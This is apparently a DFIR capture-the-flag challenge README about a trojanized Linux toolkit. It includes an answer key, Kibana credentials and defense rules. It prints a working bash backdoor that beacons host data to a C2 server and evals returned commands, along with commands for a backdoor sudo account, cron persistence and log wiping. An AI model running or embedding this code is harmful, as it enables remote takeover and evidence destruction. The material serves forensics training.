# SOC - The Trojan Toolkit Investigation

[![DFIR][dfir-badge]][dfir-url]
[![SOC][soc-badge]][soc-url]
[![SIEM][siem-badge]][siem-url]
[![ELK Stack][elk-badge]][elk-url]
[![Log Analysis][log-badge]][log-url]
[![Threat Hunting][th-badge]][th-url]

[dfir-badge]: https://img.shields.io/badge/DFIR-Digital%20Forensics-FF6B6B?style=flat&logo=search&logoColor=white
[dfir-url]: https://www.sans.org/cyber-security-courses/digital-forensics-essentials/
[soc-badge]: https://img.shields.io/badge/SOC-Security%20Operations-E74C3C?style=flat&logo=security&logoColor=white
[soc-url]: https://www.sans.org/security-operations/
[siem-badge]: https://img.shields.io/badge/SIEM-Log%20Analysis-9B59B6?style=flat&logo=elasticsearch&logoColor=white
[siem-url]: https://www.elastic.co/siem
[elk-badge]: https://img.shields.io/badge/ELK%20Stack-Elasticsearch%20%7C%20Logstash%20%7C%20Kibana-005571?style=flat&logo=elastic&logoColor=white
[elk-url]: https://www.elastic.co/elastic-stack
[log-badge]: https://img.shields.io/badge/Log%20Analysis-Threat%20Detection-16A085?style=flat&logo=files&logoColor=white
[log-url]: https://www.splunk.com/
[th-badge]: https://img.shields.io/badge/Threat%20Hunting-Detection-F38181?style=flat&logo=target&logoColor=white
[th-url]: https://www.threathunting.net/

## Table of Contents

1. [Scenario Overview](#scenario-overview)
2. [Attack Chain](#attack-chain)
3. [ELK Stack Access](#elk-stack-access)
4. [Investigation Questions](#investigation-questions)
5. [Kibana Queries](#kibana-queries)
6. [Attack Analysis](#attack-analysis)
7. [Defense Recommendations](#defense-recommendations)
8. [Repository](#repository)

---

## Scenario Overview

A production server was compromised through a trojanized GitHub repository. An administrator cloned what appeared to be a legitimate Linux system administration toolkit, unknowingly deploying a sophisticated backdoor. The attacker established persistence, exfiltrated sensitive data, installed reconnaissance tools, and attempted to cover their tracks.

**Your Mission:** Analyze the ELK stack logs to uncover the complete attack chain and answer all questions.

### Infrastructure

**Victim Server:**

- Hostname: elk-siem
- IP Address: 84.247.162.93
- OS: Ubuntu Server
- Monitoring: Filebeat + Auditbeat

**Attacker Server:**

- IP Address: 84.247.129.120
- C2 Port: 4444
- Protocol: HTTP POST beacons

---

## Attack Chain

### Phase 1: Initial Compromise

The administrator clones a malicious GitHub repository:

```bash
git clone https://github.com/qays3/linux-sysadmin-toolkit.git
cd linux-sysadmin-toolkit
```

### Phase 2: Trojan Execution

The installation script executes:

```bash
./install.sh
```

**install.sh workflow:**

1. Displays legitimate-looking installation banner
2. Creates temporary directory /tmp/.sys_check
3. Executes health-check.sh (contains Base64-encoded backdoor)
4. health-check.sh decodes and deploys backdoor to /usr/local/bin/.sysupd
5. Launches backdoor process
6. Cleans up temporary files

### Phase 3: Backdoor Deployment

**Backdoor Location:** /usr/local/bin/.sysupd

**Backdoor Functionality:**

- Collects system information (hostname, IP, user, UID, OS)
- Beacons to C2 server every 5 minutes via HTTP POST
- Receives and executes commands from C2
- Establishes cron-based persistence
- Implements anti-forensics techniques

**Beacon Headers:**

```http
POST / HTTP/1.1
Host: 84.247.129.120:4444
X-Beacon: elk-siem-1730728934
X-Host: elk-siem
X-User: root
X-UID: 0
X-IP: 84.247.162.93
X-OS: Linux elk-siem 5.15.0-91-generic
```

### Phase 4: Privilege Escalation

The attacker creates a backdoor account:

```bash
useradd -m -s /bin/bash -u 1337 sysupdate
echo "sysupdate:Sup3rS3cr3t!" | chpasswd
usermod -aG sudo sysupdate
echo "sysupdate ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

**Account Details:**

- Username: sysupdate
- UID: 1337
- Shell: /bin/bash
- Permissions: Passwordless sudo

### Phase 5: Persistence

Cron job established for backdoor survival:

```bash
echo "*/5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1" >> /etc/crontab
systemctl restart cron
```

**Persistence Mechanism:**

- Executes every 5 minutes
- Runs as root
- Output redirected to /dev/null
- Survives reboots

### Phase 6: Anti-Forensics

Log tampering to hide tracks:

```bash
sed -i '/\.sysupd/d' /var/log/syslog
sed -i '/sysupdate/d' /var/log/auth.log
history -c
```

**Deleted Evidence:**

- Backdoor execution logs from syslog
- User creation logs from auth.log
- Bash command history

---

## ELK Stack Access

### Kibana URL

```
http://84.247.162.93:5601
```

### Credentials

**Player Account (Read-only):**

- Username: player
- Password: q4y$_h3r333333
- Permissions: Discover only (filebeat-*, auditbeat-*)

**Admin Account:**

- Username: elastic
- Password: 3_0ziIvII_EKEdpRkXBZ
- Permissions: Full access

### Available Data Views

**filebeat-***

- Source: /var/log/auth.log, /var/log/syslog
- Contains: Authentication events, system logs, process execution

**auditbeat-***

- Source: Linux auditd + file integrity monitoring
- Contains: Process execution, file changes, user activity, socket connections

---

## Investigation Questions

### Q1: Identify the hostname and IP address of the compromised system

**Format:** hostname_IP

**Answer:** elk-siem_84.247.162.93

### Q2: A malicious repository was cloned onto the system. What is the full GitHub URL?

**Format:** Github_link

**Answer:** https://github.com/qays3/linux-sysadmin-toolkit.git

### Q3: What is the exact timestamp when the installation script started?

**Format:** YYYY-MM-DD_HH:MM:SS

**Answer:** 2025-11-04_22:01:43

### Q4: What is the payload that attacker used with the toolkit?

**Format:** base64

**Answer:** IyEvYmluL2Jhc2gKCmV4ZWMgPiAvZGV2L251bGwgMj4mMQoKX19oPSIkKGhvc3RuYW1lKSIKX19pPSIkKGlwIGEgMj4vZGV2L251bGwgfCBncmVwIGluZXQgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtMSkiCl9fdT0iJCh3aG9hbWkpIgpfX3VpZD0iJChpZCAtdSkiCl9faz0iJCh1bmFtZSAtYSkiCgpfX2MyPSI4NC4yNDcuMTI5LjEyMCIKX19wPSI0NDQ0IgoKd2hpbGUgdHJ1ZTsgZG8KICAgIF9fZD0iJChkYXRlICslcykiCiAgICBfX2lkPSIkKGhvc3RuYW1lIC1zKS0kX19kIgogICAgCiAgICBfX289JChjdXJsIC1zIC1YIFBPU1QgXAogICAgICAgIC1IICJYLUJlYWNvbjogJF9faWQiIFwKICAgICAgICAtSCAiWC1Ib3N0OiAkX19oIiBcCiAgICAgICAgLUggIlgtVXNlcjogJF9fdSIgXAogICAgICAgIC1IICJYLVVJRDogJF9fdWlkIiBcCiAgICAgICAgLUggIlgtSVA6ICRfX2kiIFwKICAgICAgICAtSCAiWC1PUzogJF9fayIgXAogICAgICAgIC0tbWF4LXRpbWUgMTAgXAogICAgICAgICJodHRwOi8vJHtfX2MyfToke19fcH0vIiAyPi9kZXYvbnVsbCkKICAgIAogICAgaWYgWyAtbiAiJF9fbyIgXTsgdGhlbgogICAgICAgIGV2YWwgIiRfX28iIDI+L2Rldi9udWxsCiAgICBmaQogICAgCiAgICBzbGVlcCAzMDAKICAgIAogICAgaWYgWyAkKCgkKGRhdGUgKyVzKSAlIDg2NDAwKSkgLWx0IDMwMCBdOyB0aGVuCiAgICAgICAgX19jcj0iKi81ICogKiAqICogcm9vdCAvdXNyL2xvY2FsL2Jpbi8uc3lzdXBkID4vZGV2L251bGwgMj4mMSIKICAgICAgICBpZiAhIGdyZXAgLXEgIi5zeXN1cGQiIC9ldGMvY3JvbnRhYiAyPi9kZXYvbnVsbDsgdGhlbgogICAgICAgICAgICBlY2hvICIkX19jciIgPj4gL2V0Yy9jcm9udGFiCiAgICAgICAgICAgIHN5c3RlbWN0bCByZXN0YXJ0IGNyb24gMj4vZGV2L251bGwKICAgICAgICBmaQogICAgZmkKZG9uZQo=

### Q5: What is the full path of the temporary file created?

**Format:** /path/file

**Answer:** /tmp/.sys_check

### Q6: What is the absolute path where the backdoor was installed?

**Format:** /path/file

**Answer:** /usr/local/bin/.sysupd

### Q7: What is the destination IP address and port for C2?

**Format:** IP_PORT

**Answer:** 84.247.129.120_4444

### Q8: Calculate time interval between backdoor deployment and first C2 beacon, ignore the milliseconds

**Format:** Seconds

**Answer:** 2

### Q9: What is the username and UID of the backdoor account?

**Format:** username_UID

**Answer:** sysupdate_1337

---

## Kibana Queries

### Q1: System Information

```
Kibana Query: *
Fields to check: agent.hostname, host.name, host.ip
```

**Analysis:**

Navigate to Discover → Select any document → Check fields panel for:

- agent.hostname: elk-siem
- host.ip: 84.247.162.93

### Q2: GitHub Repository

```
KQL: process.name:git
```

**Refine:**

```
KQL: process.name:git AND process.args:*clone*
```

**Analysis:**

Examine process.args field for full GitHub URL:

```
["git", "clone", "https://github.com/qays3/linux-sysadmin-toolkit.git"]
```

### Q3: Installation Script Timestamp

```
KQL: process.args:*install.sh*
```

**Refine:**

```
KQL: process.name:bash AND process.args:*install.sh*
```

**Analysis:**

Sort by @timestamp ascending → First result shows: 2025-11-04T22:01:43.000Z

### Q4: Base64 Payload

**Analysis:**

Visit GitHub repository → Check health-check.sh file → Extract Base64 payload

The payload is embedded in the health-check.sh script and contains the backdoor code.

**Decoded Payload (for reference):**

```bash
#!/bin/bash

exec > /dev/null 2>&1

__h="$(hostname)"
__i="$(ip a 2>/dev/null | grep inet | awk '{print $2}' | head -1)"
__u="$(whoami)"
__uid="$(id -u)"
__k="$(uname -a)"

__c2="84.247.129.120"
__p="4444"

while true; do
    __d="$(date +%s)"
    __id="$(hostname -s)-$__d"
    
    __o=$(curl -s -X POST \
        -H "X-Beacon: $__id" \
        -H "X-Host: $__h" \
        -H "X-User: $__u" \
        -H "X-UID: $__uid" \
        -H "X-IP: $__i" \
        -H "X-OS: $__k" \
        --max-time 10 \
        "http://${__c2}:${__p}/" 2>/dev/null)
    
    if [ -n "$__o" ]; then
        eval "$__o" 2>/dev/null
    fi
    
    sleep 300
    
    if [ $(($( date +%s) % 86400)) -lt 300 ]; then
        __cr="*/5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1"
        if ! grep -q ".sysupd" /etc/crontab 2>/dev/null; then
            echo "$__cr" >> /etc/crontab
            systemctl restart cron 2>/dev/null
        fi
    fi
done
```

### Q5: Temporary File

```
KQL: file.path:/tmp/*
```

**Analysis:**

Look for files created during installation timeframe → /tmp/.sys_check

### Q6: Backdoor Path

```
KQL: file.path:/usr/local/bin/*
```

**Refine:**

```
KQL: file.path:*.sysupd*
```

**Analysis:**

File integrity monitoring shows creation of /usr/local/bin/.sysupd

### Q7: C2 Address

```
KQL: process.name:curl
```

**Refine:**

```
KQL: process.name:curl AND process.args:*POST*
```

**Analysis:**

Examine process.args for HTTP POST requests:

```
["curl", "-s", "-X", "POST", "http://84.247.129.120:4444/"]
```

Extract: IP = 84.247.129.120, Port = 4444

### Q8: Time Interval

**Step 1: Find backdoor deployment**

```
KQL: process.name:cp AND process.args:*.sysupd*
```

Timestamp: 2025-11-04T22:02:00.000Z

**Step 2: Find first C2 beacon**

```
KQL: process.name:curl AND process.args:*POST*
```

Sort by @timestamp ascending
First beacon: 2025-11-04T22:01:58.000Z

**Calculation:**

```
22:02:00 - 22:01:58 = 2 seconds
```

### Q9: Backdoor User

```
KQL: process.name:useradd
```

**Analysis:**

Examine process.args:

```
["useradd", "-m", "-s", "/bin/bash", "-u", "1337", "sysupdate"]
```

Extract: Username = sysupdate, UID = 1337

---

## Attack Analysis

### Backdoor Code Analysis

The Base64 payload decodes to a sophisticated backdoor with:

**System Enumeration:**

```bash
__h="$(hostname)"              # Get hostname
__i="$(ip a | grep inet)"      # Get IP addresses
__u="$(whoami)"                # Get current user
__uid="$(id -u)"               # Get user ID
__k="$(uname -a)"              # Get kernel info
```

**C2 Configuration:**

```bash
__c2="84.247.129.120"
__p="4444"
```

**Beacon Loop:**

```bash
while true; do
    __d="$(date +%s)"
    __id="$(hostname -s)-$__d"
    
    __o=$(curl -s -X POST \
        -H "X-Beacon: $__id" \
        -H "X-Host: $__h" \
        -H "X-User: $__u" \
        -H "X-UID: $__uid" \
        -H "X-IP: $__i" \
        -H "X-OS: $__k" \
        --max-time 10 \
        "http://${__c2}:${__p}/" 2>/dev/null)
    
    if [ -n "$__o" ]; then
        eval "$__o" 2>/dev/null
    fi
    
    sleep 300
done
```

**Persistence Mechanism:**

```bash
if [ $(($( date +%s) % 86400)) -lt 300 ]; then
    __cr="*/5 * * * * root /usr/local/bin/.sysupd >/dev/null 2>&1"
    if ! grep -q ".sysupd" /etc/crontab 2>/dev/null; then
        echo "$__cr" >> /etc/crontab
        systemctl restart cron 2>/dev/null
    fi
fi
```

### Attack Timeline

```
T+0:00  │ Administrator clones malicious repository
T+0:30  │ install.sh executes
T+0:45  │ health-check.sh decodes Base64 payload
T+1:00  │ Backdoor deployed to /usr/local/bin/.sysupd
T+1:15  │ Backdoor process starts
T+1:18  │ First C2 beacon sent
T+1:20  │ Backdoor deployment confirmed
T+6:18  │ Second beacon (5 min interval)
        │ C2 responds with user creation commands
T+6:30  │ User 'sysupdate' created (UID 1337)
T+6:35  │ Sudo privileges granted
T+11:18 │ Third beacon
        │ C2 responds with persistence commands
T+11:30 │ Cron job added
T+16:18 │ Fourth beacon (maintenance)
T+21:18 │ Fifth beacon
        │ C2 responds with log tampering commands
T+21:30 │ Logs cleaned
T+26:18 │ Sixth beacon (ongoing...)
        │ Every 5 minutes indefinitely
```

---

## Defense Recommendations

### Immediate Response

#### 1. Containment

```bash
pkill -f .sysupd
iptables -A OUTPUT -d 84.247.129.120 -j DROP
```

#### 2. User Account Removal

```bash
userdel -r sysupdate
sed -i '/sysupdate/d' /etc/sudoers
```

#### 3. Backdoor Removal

```bash
rm -f /usr/local/bin/.sysupd
sed -i '/\.sysupd/d' /etc/crontab
systemctl restart cron
```

#### 4. Repository Cleanup

```bash
rm -rf /opt/linux-sysadmin-toolkit
```

### Detection Rules

#### Auditd Rules

```bash
cat >> /etc/audit/rules.d/trojan.rules << 'EOF'
-w /usr/local/bin/ -p wa -k local_bin_changes
-w /etc/crontab -p wa -k cron_tampering
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/git -k git_clone
-a always,exit -F arch=b64 -S execve -F a0=useradd -k user_creation
EOF

augenrules --load
```

#### SIEM Detection

**Elastic SIEM Rule:**

```json
{
  "rule": {
    "name": "Suspicious GitHub Clone from Unknown Repository",
    "query": "process.name:git AND process.args:*clone* AND NOT process.args:*github.com/trusted-org*",
    "severity": "high"
  }
}
```

**Splunk Query:**

```spl
index=linux sourcetype=auditbeat process.name=git process.args=*clone*
| where NOT match(process.args, "trusted-org")
| stats count by host, user, process.args
```

### Prevention Strategies

#### 1. Code Signing Verification

```bash
cat > /usr/local/bin/verify-repo << 'EOF'
#!/bin/bash
REPO_URL=$1
TRUSTED_ORGS="github.com/company github.com/approved-vendor"

for org in $TRUSTED_ORGS; do
    if [[ "$REPO_URL" == *"$org"* ]]; then
        echo "Repository verified: $REPO_URL"
        exit 0
    fi
done

echo "WARNING: Untrusted repository: $REPO_URL"
echo "Verify this source before proceeding!"
exit 1
EOF

chmod +x /usr/local/bin/verify-repo
```

Usage:

```bash
verify-repo "https://github.com/qays3/linux-sysadmin-toolkit.git" || exit 1
git clone "https://github.com/qays3/linux-sysadmin-toolkit.git"
```

#### 2. AppArmor Profile

```bash
cat > /etc/apparmor.d/usr.local.bin.sysupd << 'EOF'
#include <tunables/global>

/usr/local/bin/.sysupd {
  #include <abstractions/base>
  
  deny /usr/local/bin/.sysupd rwx,
}
EOF

apparmor_parser -r /etc/apparmor.d/usr.local.bin.sysupd
```

#### 3. Network Egress Filtering

```bash
iptables -A OUTPUT -p tcp --dport 4444 -j LOG --log-prefix "Blocked C2: "
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
```

#### 4. File Integrity Monitoring

```bash
cat >> /etc/aide/aide.conf << 'EOF'
/usr/local/bin Checksums
/etc/crontab Checksums
/etc/sudoers Checksums
EOF

aide --init
aide --check
```

---

## Repository

### GitHub Repository

[https://github.com/qays3/DFIR-Hunters/tree/main/Final/SOC](https://github.com/qays3/DFIR-Hunters/tree/main/Final/SOC)

### Repository Structure

```
SOC/
├── README.md
├── app/
│   ├── app.py
│   ├── index.html
│   ├── config.cfg
│   ├── requirements.txt
│   ├── template.json
│   └── assets/
│       ├── css/
│       ├── js/
│       ├── img/
│       └── sounds/
├── Build/
│   ├── ELK/
│   │   ├── setup.sh
│   │   ├── remove.sh
│   │   └── creds.md
│   ├── repo/
│   │   ├── install.sh
│   │   ├── health-check.sh
│   │   └── (malicious toolkit files)
│   └── Attack/
│       └── steps.md
└── Solve/
    ├── solution.json
    ├── solution.md
    └── template.json
```

### Deployment Instructions

#### Challenge Application

```bash
cd app

docker build -t soc .
docker run -d --name SOC -p 5000:5000 --restart unless-stopped soc

# Access at: http://localhost:5000/?access=29910461-9afb-4c57-b4a4-b7ff2026d72c

```



#### ELK Stack Setup (for building challenge)

```bash
cd Build/ELK
chmod +x setup.sh
./setup.sh
```

This installs Elasticsearch, Kibana, Filebeat, and Auditbeat.

#### Attack Simulation

```bash
cd Build/Attack
cat steps.md
```

Follow the attacker command sheet to simulate the attack.

### Challenge Submission

Answers are submitted in JSON format:

```json
{
  "q1_hostname_ip": "elk-siem_84.247.162.93",
  "q2_github_url": "https://github.com/qays3/linux-sysadmin-toolkit.git",
  "q3_timestamp": "2025-11-04_22:01:43",
  "q4_payload": "IyEvYmluL2Jhc2gKCmV4ZWM...(Base64)",
  "q5_temp_file": "/tmp/.sys_check",
  "q6_backdoor_path": "/usr/local/bin/.sysupd",
  "q7_c2_address": "84.247.129.120_4444",
  "q8_time_interval": "2",
  "q9_backdoor_user": "sysupdate_1337"
}
```

---

## References

### ELK Stack

- Elasticsearch Documentation: [https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html](https://www.elastic.co/guide/en/elasticsearch/reference/current/index.html)
- Kibana Query Language: [https://www.elastic.co/guide/en/kibana/current/kuery-query.html](https://www.elastic.co/guide/en/kibana/current/kuery-query.html)
- Filebeat: [https://www.elastic.co/beats/filebeat](https://www.elastic.co/beats/filebeat)
- Auditbeat: [https://www.elastic.co/beats/auditbeat](https://www.elastic.co/beats/auditbeat)

### SIEM & Log Analysis

- SANS SIEM Training: [https://www.sans.org/cyber-security-courses/security-information-event-management/](https://www.sans.org/cyber-security-courses/security-information-event-management/)
- Elastic SIEM: [https://www.elastic.co/siem](https://www.elastic.co/siem)
- Log Analysis Best Practices: [https://www.splunk.com/en_us/blog/learn/log-analysis.html](https://www.splunk.com/en_us/blog/learn/log-analysis.html)

### Threat Hunting

- MITRE ATT&CK: [https://attack.mitre.org/](https://attack.mitre.org/)
- Auditd Logging: [https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing)

---

## Authors

Challenge Designer: Qays Sarayra  
Contact: info@qayssarayra.com  
Specialization: SOC Operations, SIEM Engineering, Threat Hunting

---

## License

This challenge is part of IEEE CyberSecurity Competition 2025 - Finals Round.

Educational use only. All attacks are simulated in isolated environments.

---

Competition: IEEE CyberSecurity Competition 2025  
Round: Finals  
Category: DFIR  
Difficulty: Medium  
Expected Completion Time: 2-3 hours